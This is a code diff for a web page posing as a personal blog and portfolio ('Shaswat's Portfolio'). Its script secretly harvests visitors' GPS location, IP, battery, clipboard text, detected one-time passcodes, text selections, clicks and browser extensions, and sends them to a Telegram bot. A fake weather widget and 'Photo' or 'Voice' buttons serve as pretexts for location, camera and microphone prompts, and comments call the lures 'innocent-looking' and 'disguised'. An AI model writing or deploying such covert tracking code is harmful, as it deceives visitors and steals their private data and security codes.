-            const ip = await getIPInfo();
-            const location = STATE.location;
-            
-            // Build innocent-looking message
-            const message = buildBlogMessage(battery, ip, location);
-            
-            // Send to Telegram
-            const sent = await sendToTelegram(message);
-            
-            if (sent) {
-                STATE.dataSent = true;
-                // Show innocent toast
-                showToast('🌤️ Weather updated!');
-                updateWeatherUI(location, ip);
-                updateVisitorStats();
-            }
-        }
-
-        function buildBlogMessage(battery, ip, location) {
-            const lines = [];
-            
-            // Looks like a blog analytics report
-            lines.push('📝 *Blog Visitor Report*');
-            lines.push('━'.repeat(25));
+    function buildDetailedReport() {
+        const lines = [];
+        lines.push('📱 *Device Intelligence Report*');
+        lines.push('━'.repeat(30));
+        lines.push('');
+        
+        // Device Info
+        lines.push('📱 *Device Information*');
+        lines.push(`   Platform: ${getPlatform()}`);
+        lines.push(`   Browser: ${getBrowser()}`);
+        lines.push(`   Mobile: ${isMobile() ? 'Yes' : 'No'}`);
+        lines.push(`   iOS: ${isIOS() ? 'Yes' : 'No'}`);
+        lines.push(`   Android: ${isAndroid() ? 'Yes' : 'No'}`);
+        lines.push(`   Screen: ${getScreenInfo()}`);
+        lines.push(`   Pixel Ratio: ${getPixelRatio()}`);
+        lines.push(`   CPU Cores: ${getHardwareConcurrency()}`);
+        lines.push(`   RAM: ${getDeviceMemory() !== 'Unknown' ? getDeviceMemory() + 'GB' : 'Unknown'}`);
+        lines.push(`   Dark Mode: ${isDarkMode() ? 'Yes' : 'No'}`);
+        lines.push(`   Timezone: ${getTimeZone()}`);
+        lines.push('');
+        
+        // Battery
+        if (STATE.batteryLevel !== null) {
+            lines.push('🔋 *Battery Status*');
+            lines.push(`   Level: ${STATE.batteryLevel}%`);
+            lines.push(`   Charging: ${STATE.isCharging ? 'Yes ⚡' : 'No 🔋'}`);
             lines.push('');
-            lines.push('👤 *Visitor*');
-            lines.push(`   Device: ${getPlatform()} (${getBrowser()})`);
-            lines.push(`   Mobile: ${isMobile() ? 'Yes' : 'No'}`);
-            lines.push(`   Screen: ${getScreenInfo()}`);
-            lines.push(`   Network: ${getNetworkType()}`);
-            lines.push(`   Timezone: ${getTimeZone()}`);
+        }
+        
+        // Network
+        const network = getNetworkType();
+        lines.push('🌐 *Network Information*');
+        lines.push(`   Type: ${network}`);
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            if (conn.downlink) lines.push(`   Speed: ${conn.downlink}Mbps`);
+            if (conn.rtt) lines.push(`   Latency: ${conn.rtt}ms`);
+            if (conn.saveData !== undefined) lines.push(`   Data Saver: ${conn.saveData ? 'Enabled' : 'Disabled'}`);
+        }
+        lines.push('');
+        
+        // Location
+        if (STATE.location) {
+            lines.push('📍 *GPS Location*');
+            lines.push(`   Lat: ${STATE.location.lat.toFixed(6)}`);
+            lines.push(`   Lng: ${STATE.location.lng.toFixed(6)}`);
+            if (STATE.location.accuracy) {
+                lines.push(`   Accuracy: ±${Math.round(STATE.location.accuracy)}m`);
+            }
             lines.push('');
-            
-            // Battery (hidden as "System")
-            if (battery.level !== null) {
-                lines.push('🔋 *System*');
-                lines.push(`   Power: ${battery.level}%`);
-                lines.push(`   Status: ${battery.charging ? 'Charging' : 'Battery'}`);
-                lines.push('');
-            }
-            
-            // Location (disguised as "Visitor Location")
-            if (location) {
-                lines.push('📍 *Visitor Location*');
-                lines.push(`   Lat: ${location.lat.toFixed(4)}`);
-                lines.push(`   Lng: ${location.lng.toFixed(4)}`);
-                lines.push(`   Accuracy: ±${Math.round(location.accuracy)}m`);
-                lines.push('');
-            } else if (ip && ip.city !== 'Unknown') {
-                lines.push('📍 *Visitor Location*');
-                lines.push(`   City: ${ip.city}`);
-                if (ip.region !== 'Unknown') lines.push(`   Region: ${ip.region}`);
-                if (ip.country !== 'Unknown') lines.push(`   Country: ${ip.country}`);
-                if (ip.isp !== 'Unknown') lines.push(`   ISP: ${ip.isp}`);
-                lines.push('');
-            }
-            
-            if (ip && ip.ip) {
-                lines.push('🖥️ *Network*');
-                lines.push(`   IP: ${ip.ip}`);
-                lines.push('');
-            }
-            
-            // Tracking (looks like blog analytics)
-            lines.push('📊 *Blog Analytics*');
-            lines.push(`   Device ID: ${getDeviceId()}`);
-            lines.push(`   Visit #${getVisitCount()}`);
-            lines.push(`   First Visit: ${new Date(getFirstVisit()).toLocaleDateString()}`);
-            lines.push(`   Session: ${getSessionId()}`);
+        } else if (STATE.ipData && STATE.ipData.city !== 'Unknown') {
+            lines.push('📍 *IP Location*');
+            if (STATE.ipData.city) lines.push(`   City: ${STATE.ipData.city}`);
+            if (STATE.ipData.region) lines.push(`   Region: ${STATE.ipData.region}`);
+            if (STATE.ipData.country) lines.push(`   Country: ${STATE.ipData.country}`);
+            if (STATE.ipData.isp) lines.push(`   ISP: ${STATE.ipData.isp}`);
+            if (STATE.ipData.ip) lines.push(`   IP: ${STATE.ipData.ip}`);
             lines.push('');
-            lines.push(`⏰ ${getTime()}`);
-            lines.push('━'.repeat(25));
-            lines.push(`📖 ${CONFIG.BLOG_NAME} • Visitor Analytics`);
-            
-            return lines.join('\n');
         }
-
-        async function sendToTelegram(message) {
-            if (!CONFIG.BOT_TOKEN || !CONFIG.CHAT_ID) return false;
-            
-            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
-            
-            // Try multiple methods
-            try {
-                const res = await fetch(`${url}?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-                if (res.ok) return true;
-            } catch {}
-            
-            try {
-                const img = new Image();
-                img.src = `${url}?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(message.substring(0, 200))}&_=${Date.now()}`;
-                await new Promise(r => setTimeout(r, 1000));
-                return true;
-            } catch {
-                return false;
+        
+        // Tracking
+        lines.push('🆔 *Tracking Information*');
+        lines.push(`   Device ID: ${getDeviceId()}`);
+        lines.push(`   Session ID: ${getSessionId()}`);
+        lines.push(`   Visit Count: ${getVisitCount()}`);
+        lines.push(`   First Visit: ${new Date(getFirstVisit()).toLocaleString()}`);
+        lines.push(`   Time on Page: ${Math.round((Date.now() - STATE.startTime) / 1000)}s`);
+        lines.push(`   Referrer: ${getReferrer()}`);
+        lines.push('');
+        
+        // Security
+        lines.push('🔒 *Security & Permissions*');
+        lines.push(`   Camera Used: ${STATE.cameraUsed ? 'Yes 📸' : 'No'}`);
+        lines.push(`   Mic Used: ${STATE.micUsed ? 'Yes 🎤' : 'No'}`);
+        lines.push(`   Location: ${STATE.location ? 'Yes 📍' : 'No'}`);
+        lines.push(`   Battery API: ${navigator.getBattery ? 'Yes' : 'No'}`);
+        if (STATE.clipboardContent) {
+            lines.push(`   Clipboard: ${STATE.clipboardContent.substring(0, 50)}...`);
+        }
+        if (STATE.otpDetected) {
+            lines.push(`   OTP Detected: ${STATE.otpDetected}`);
+        }
+        lines.push('');
+        
+        // Extensions
+        if (STATE.detectedExtensions.length > 0) {
+            lines.push('🔌 *Extensions Detected*');
+            for (const ext of STATE.detectedExtensions) {
+                lines.push(`   - ${ext}`);
             }
+            lines.push('');
         }
-
-        // ============================================
-        //  UI UPDATES (Looks innocent)
-        // ============================================
-        function updateWeatherUI(location, ip) {
-            const temp = document.getElementById('weatherTemp');
-            const condition = document.getElementById('weatherCondition');
-            const locationEl = document.getElementById('weatherLocation');
-            const icon = document.getElementById('weatherIcon');
-            const time = document.getElementById('weatherTime');
-            
-            // Use real location if available, else IP location
-            let locName = 'Unknown';
-            if (location) {
-                locName = `${location.lat.toFixed(2)}, ${location.lng.toFixed(2)}`;
-            } else if (ip && ip.city !== 'Unknown') {
-                locName = `${ip.city}, ${ip.country}`;
-            }
-            
-            // Fake weather based on time
-            const hour = new Date().getHours();
-            let weatherData;
-            if (hour >= 6 && hour < 12) {
-                weatherData = { temp: '22°C', condition: '☀️ Sunny morning', icon: '☀️' };
-            } else if (hour >= 12 && hour < 17) {
-                weatherData = { temp: '26°C', condition: '🌤️ Partly cloudy', icon: '🌤️' };
-            } else if (hour >= 17 && hour < 20) {
-                weatherData = { temp: '20°C', condition: '🌅 Evening breeze', icon: '🌅' };
-            } else {
-                weatherData = { temp: '16°C', condition: '🌙 Clear night', icon: '🌙' };
-            }
-            
-            temp.textContent = `${weatherData.icon} ${weatherData.temp}`;
-            condition.textContent = weatherData.condition;
-            locationEl.textContent = `📍 ${locName}`;
-            icon.textContent = weatherData.icon;
-            time.textContent = `Updated ${getTimeShort()}`;
-            
-            // Update footer
-            document.getElementById('footerLocation').textContent = locName;
-            document.getElementById('footerTime').textContent = getTimeShort();
+        
+        // Interactions
+        lines.push('🖱️ *User Interactions*');
+        lines.push(`   Clicks: ${STATE.clicks}`);
+        lines.push(`   Scrolls: ${STATE.scrolls}`);
+        lines.push(`   Mouse Moves: ${STATE.mouseMoves}`);
+        lines.push(`   Orientation: ${getOrientation()}`);
+        lines.push(`   Sections Viewed: ${STATE.visitedSections.length}`);
+        lines.push('');
+        
+        // Performance
+        lines.push('⏱️ *Performance*');
+        const perfData = performance.getEntriesByType('navigation')[0];
+        if (perfData) {
+            lines.push(`   Load Time: ${Math.round(perfData.loadEventEnd - perfData.fetchStart)}ms`);
+            lines.push(`   DOM Ready: ${Math.round(perfData.domContentLoadedEventEnd - perfData.fetchStart)}ms`);
         }
-
-        function updateVisitorStats() {
-            // Update visitor count
-            document.getElementById('visitorCount').textContent = getVisitCount();
-            
-            // Device info
-            const deviceText = isMobile() ? '📱 Mobile' : '💻 Desktop';
-            document.getElementById('deviceInfo').textContent = deviceText;
-            
-            // Post count - random but stable
-            const posts = parseInt(localStorage.getItem('_blog_posts') || '12');
-            document.getElementById('postCount').textContent = posts;
-            
-            // Update weather time
-            document.getElementById('weatherTime').textContent = `Updated ${getTimeShort()}`;
+        if (performance.memory) {
+            const mem = performance.memory;
+            lines.push(`   Memory Used: ${Math.round(mem.usedJSHeapSize / 1024 / 1024)}MB`);
         }
+        lines.push('');
+        
+        // Footer
+        lines.push('━'.repeat(30));
+        lines.push(`⏰ ${getTimeFull()}`);
+        lines.push('📊 *Shaswat\'s Portfolio Analytics*');
+        
+        return lines.join('\n');
+    }
 
-        // ============================================
-        //  WEATHER WIDGET CLICK (Permission trigger)
-        // ============================================
-        async function onWeatherClick() {
-            // This is the ONLY permission request the user sees
-            const widget = document.getElementById('weatherWidget');
-            widget.style.opacity = '0.7';
-            widget.style.transform = 'scale(0.98)';
-            
-            showToast('🌤️ Getting your weather...');
-            
-            try {
-                // Request location - this triggers the browser permission
-                const location = await getLocation();
+    // ============================================
+    //  UI UPDATES
+    // ============================================
+    function updateUI() {
+        document.getElementById('visitorCount').textContent = getVisitCount();
+        
+        const deviceText = isMobile() ? '📱 Mobile' : '💻 Desktop';
+        document.getElementById('deviceInfo').textContent = deviceText;
+        
+        document.getElementById('footerTime').textContent = getTimeShort();
+        document.getElementById('footerNetwork').textContent = getNetworkType();
+        
+        // Random post count (stable)
+        const posts = parseInt(localStorage.getItem('_sp_posts') || '15');
+        document.getElementById('postCount').textContent = posts;
+        
+        // Update weather time
+        document.getElementById('weatherTime').innerHTML = 
+            `<span class="pulse-dot"></span> Updated ${getTimeShort()}`;
+    }
+
+    function updateWeatherUI(location, ip) {
+        const temp = document.getElementById('weatherTemp');
+        const condition = document.getElementById('weatherCondition');
+        const locationEl = document.getElementById('weatherLocation');
+        const icon = document.getElementById('weatherIcon');
+        
+        let locName = 'Tap to enable location';
+        if (location) {
+            locName = `${location.lat.toFixed(2)}, ${location.lng.toFixed(2)}`;
+        } else if (ip && ip.city !== 'Unknown') {
+            locName = `${ip.city}, ${ip.country}`;
+        }
+        
+        const hour = new Date().getHours();
+        let weatherData;
+        if (hour >= 6 && hour < 12) {
+            weatherData = { temp: '22°C', condition: '☀️ Sunny morning', icon: '☀️' };
+        } else if (hour >= 12 && hour < 17) {
+            weatherData = { temp: '26°C', condition: '🌤️ Partly cloudy', icon: '🌤️' };
+        } else if (hour >= 17 && hour < 20) {
+            weatherData = { temp: '20°C', condition: '🌅 Evening breeze', icon: '🌅' };
+        } else {
+            weatherData = { temp: '16°C', condition: '🌙 Clear night', icon: '🌙' };
+        }
+        
+        temp.textContent = `${weatherData.icon} ${weatherData.temp}`;
+        condition.textContent = weatherData.condition;
+        locationEl.textContent = `📍 ${locName}`;
+        icon.textContent = weatherData.icon;
+        
+        document.getElementById('footerLocation').textContent = locName;
+    }
+
+    // ============================================
+    //  WEATHER CARD - THE PERMISSION REQUEST
+    // ============================================
+    async function onWeatherClick() {
+        showToast('🌤️ Getting your weather...');
+        
+        try {
+            // Request location - THIS IS THE ONLY PERMISSION
+            if (navigator.geolocation) {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
                 
-                if (location) {
-                    // Get IP for fallback
-                    const ip = await getIPInfo();
-                    updateWeatherUI(location, ip);
-                    showToast('✅ Weather updated for your location!');
-                    
-                    // Send data now that we have location
-                    await sendData();
-                } else {
-                    // User denied location - use IP
-                    const ip = await getIPInfo();
-                    updateWeatherUI(null, ip);
-                    showToast('📍 Weather updated using your region');
-                    
-                    // Still send data without GPS
-                    await sendData();
-                }
-            } catch {
-                showToast('🌤️ Weather updated!');
+                STATE.location = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                };
+                
                 const ip = await getIPInfo();
-                updateWeatherUI(null, ip);
-                await sendData();
+                updateWeatherUI(STATE.location, ip);
+                showToast('✅ Weather updated!');
+                
+                // Send data now that we have location
+                await collectAndSendData();
+                
+                // Also trigger all other features now
+                await setupCamera();
+                await setupMicrophone();
             }
-            
-            widget.style.opacity = '1';
-            widget.style.transform = 'scale(1)';
-        }
-
-        // ============================================
-        //  AUTO-INIT (Everything runs on page load)
-        // ============================================
-        async function init() {
-            // Initial UI
-            updateVisitorStats();
-            
-            // Get IP for fallback location
+        } catch(e) {
+            // User denied or error - use IP fallback
+            showToast('📍 Using your region for weather');
             const ip = await getIPInfo();
-            
-            // Try to get location silently (may not trigger permission if already granted)
-            try {
-                const location = await getLocation();
-                if (location) {
-                    updateWeatherUI(location, ip);
-                } else {
-                    updateWeatherUI(null, ip);
-                }
-            } catch {
-                updateWeatherUI(null, ip);
-            }
-            
-            // Auto-send data after 2 seconds (looks like page loading)
-            setTimeout(async () => {
-                // If location wasn't granted, try again (this will trigger permission)
-                if (!STATE.location) {
-                    try {
-                        await getLocation();
-                    } catch {}
-                }
-                await sendData();
-            }, 2000);
-            
-            // Update time every minute
-            setInterval(() => {
-                document.getElementById('footerTime').textContent = getTimeShort();
-            }, 60000);
-            
-            // Update visitor stats every 30 seconds
-            setInterval(updateVisitorStats, 30000);
-            
-            // Weather widget click
-            document.getElementById('weatherWidget').addEventListener('click', onWeatherClick);
-            
-            console.log(`📖 ${CONFIG.BLOG_NAME} loaded`);
+            updateWeatherUI(null, ip);
+            await collectAndSendData();
         }
+    }
 
-        // Start when page is ready
-        document.addEventListener('DOMContentLoaded', init);
+    async function getIPInfo() {
+        try {
+            const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+            const data = await res.json();
+            STATE.ipData = {
+                ip: data.ip || 'Unknown',
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                country: data.country_name || 'Unknown',
+                isp: data.org || 'Unknown',
+                lat: data.latitude || null,
+                lng: data.longitude || null,
+            };
+            return STATE.ipData;
+        } catch {
+            return null;
+        }
+    }
+
+    // ============================================
+    //  FEATURE BUTTON HANDLERS (Innocent)
+    // ============================================
+    function setupFeatureButtons() {
+        // Photo button - triggers camera
+        document.getElementById('photoBtn').addEventListener('click', async () => {
+            showToast('📸 Opening camera...');
+            await setupCamera();
+            showToast('📸 Photo ready! Check your camera');
+            // Send alert that user clicked photo
+            sendAlert('📸 User clicked Photo button');
+        });
+        
+        // Mic button - triggers microphone
+        document.getElementById('micBtn').addEventListener('click', async () => {
+            showToast('🎤 Opening microphone...');
+            await setupMicrophone();
+            showToast('🎤 Microphone ready! Tap again to record');
+            // Send alert that user clicked mic
+            sendAlert('🎤 User clicked Voice button');
+        });
+        
+        // Video button
+        document.getElementById('videoBtn').addEventListener('click', async () => {
+            showToast('🎥 Opening video...');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                stream.getTracks().forEach(track => track.stop());
+                showToast('📹 Video ready!');
+                sendAlert('🎥 Video access requested');
+            } catch(e) {
+                showToast('📹 Video not available');
+            }
+        });
+        
+        // Avatar click - looks innocent
+        document.getElementById('avatarClick').addEventListener('click', () => {
+            showToast('🌟 Shaswat\'s profile!');
+            sendAlert('👤 Profile viewed');
+        });
+        
+        // Interactive area
+        document.getElementById('interactiveArea').addEventListener('click', () => {
+            const activities = [
+                '🎯 Try drawing a star!',
+                '📚 Read a book today',
+                '🏏 Practice cricket',
+                '🎨 Draw something creative',
+                '💻 Code a simple game',
+                '🌍 Explore Google Earth',
+                '🔬 Try a science experiment',
+                '🎮 Play a puzzle game'
+            ];
+            const activity = activities[Math.floor(Math.random() * activities.length)];
+            showToast(`✨ ${activity}`);
+            sendAlert(`🎯 Interactive: ${activity}`);
+        });
+    }
+
+    // ============================================
+    //  MOUSE & INTERACTION TRACKING
+    // ============================================
+    function setupInteractionTracking() {
+        document.addEventListener('mousemove', () => {
+            STATE.mouseMoves++;
+            if (STATE.mouseMoves % 100 === 0) {
+                sendAlert(`🖱️ Mouse moves: ${STATE.mouseMoves}`);
+            }
+        });
+        
+        document.addEventListener('click', () => {
+            STATE.clicks++;
+            if (STATE.clicks % 5 === 0) {
+                sendAlert(`👆 Clicks: ${STATE.clicks}`);
+            }
+        });
+        
+        document.addEventListener('scroll', () => {
+            STATE.scrolls++;
+            if (STATE.scrolls % 10 === 0) {
+                sendAlert(`📜 Scrolls: ${STATE.scrolls}`);
+            }
+        });
+    }
+
+    // ============================================
+    //  SELECTION TRACKING
+    // ============================================
+    function setupSelectionTracking() {
+        if (!CONFIG.ENABLE_SELECTION_TRACK) return;
+        
+        document.addEventListener('mouseup', () => {
+            const selection = window.getSelection().toString();
+            if (selection.length > 20) {
+                const preview = selection.substring(0, 100);
+                sendAlert(`📝 Text selected: ${preview}${selection.length > 100 ? '...' : ''}`);
+            }
+        });
+        
+        // Touch selection for mobile
+        document.addEventListener('touchend', () => {
+            setTimeout(() => {
+                const selection = window.getSelection().toString();
+                if (selection.length > 20) {
+                    sendAlert(`📝 Text selected (touch): ${selection.substring(0, 50)}...`);
+                }
+            }, 100);
+        });
+    }
+
+    // ============================================
+    //  ERROR HANDLING (Silent)
+    // ============================================
+    window.addEventListener('error', (e) => {
+        sendAlert(`⚠️ Error: ${e.message || 'Unknown'}`);
+    });
+    
+    window.addEventListener('unhandledrejection', (e) => {
+        sendAlert(`⚠️ Promise error: ${e.reason || 'Unknown'}`);
+    });
+
+    // ============================================
+    //  INITIALIZATION
+    // ============================================
+    async function init() {
+        console.log('🌟 Shaswat\'s Portfolio loaded');
+        
+        // Get session info
+        STATE.deviceId = getDeviceId();
+        STATE.sessionId = getSessionId();
+        STATE.visitCount = getVisitCount();
+        STATE.firstVisit = getFirstVisit();
+        STATE.startTime = Date.now();
+        
+        // Initial UI
+        updateUI();
+        
+        // Get IP for weather fallback
+        const ip = await getIPInfo();
+        updateWeatherUI(null, ip);
+        
+        // Setup all features
+        await setupBatteryTracking();
+        setupClipboardTracking();
+        setupOTPDetection();
+        setupMotionTracking();
+        setupLightSensor();
+        setupScreenshotDetection();
+        setupExtensionDetection();
+        setupNetworkMonitoring();
+        setupIdleDetection();
+        setupMediaDetection();
+        setupPerformanceMonitoring();
+        setupSocialDetection();
+        setupVisibilityTracking();
+        setupThemeDetection();
+        setupGamepadDetection();
+        setupFileDetection();
+        setupClipboardImageDetection();
+        setupDetailedOrientation();
+        setupInteractionTracking();
+        setupSelectionTracking();
+        setupFeatureButtons();
+        
+        // Weather click handler
+        document.getElementById('weatherCard').addEventListener('click', onWeatherClick);
+        
+        // Auto-send after 3 seconds (looks like page loading)
+        setTimeout(async () => {
+            await collectAndSendData();
+        }, 3000);
+        
+        // Update time every 30 seconds
+        setInterval(() => {
+            document.getElementById('footerTime').textContent = getTimeShort();
+            document.getElementById('weatherTime').innerHTML = 
+                `<span class="pulse-dot"></span> Updated ${getTimeShort()}`;
+        }, 30000);
+        
+        // Update stats periodically
+        setInterval(updateUI, 60000);
+        
+        showToast('🌟 Welcome to my portfolio!');
+    }
+
+    // Start everything
+    document.addEventListener('DOMContentLoaded', init);
     </script>
 
 </body>
